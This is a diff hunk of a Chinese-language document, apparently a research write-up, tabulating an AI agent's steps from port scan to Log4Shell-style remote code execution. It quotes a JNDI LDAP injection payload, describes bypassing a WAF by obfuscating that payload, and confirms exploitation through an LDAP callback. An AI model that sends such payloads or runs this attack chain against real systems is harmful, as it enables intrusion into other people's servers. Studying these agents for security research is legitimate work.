@@ -127,7 +127,7 @@ $$\text{EfficiencyScore}(a) = \frac{SuccessCount_a}{UsageCount_a}$$
 | :--- | :--- | :--- | :--- |
 | **1** | `port_scanner` | 探测目标端口 `:8080` 的 TCP 套接字。 | 发现 HTTP 端口（$b(S_{recon}) = 1$）。 |
 | **2** | `discovery` | 分析标头和页面结构。 | 识别出参数 `X-Api-Version` 作为入口点（$b(S_{discovery}) = 1$）。 |
-| **3** | `payload_generator` | 构建原始 JNDI 漏洞利用签名。 | 利用 \${jndi:ldap://127.0.0.1:1389/Exploit\} 更新有效载荷（$b(S_{payload}) = 1$）。 |
+| **3** | `payload_generator` | 构建原始 JNDI 漏洞利用签名。 | 利用 `\${jndi:ldap://127.0.0.1:1389/Exploit\}` 更新有效载荷（$b(S_{payload}) = 1$）。 |
 | **4** | `prober` | 尝试利用。智能体发送有效载荷。 | 被目标的 WAF 拦截。$\text{EfficiencyScore}(\text{prober}) = 0$。 |
 | **5** | `semantic_fuzzer` | 通过嵌套查找进行签名变异。 | 生成混淆后的有效载荷（$b(S_{payload}) = 1$，绕过 WAF）。 |
 | **6** | `prober` | 发送带有变异签名的漏洞利用有效载荷。 | LDAP 服务器捕获传入的 TCP 重定向。确认实现远程代码执行/RCE（$b(S_{exploit}) = 1$）。 |
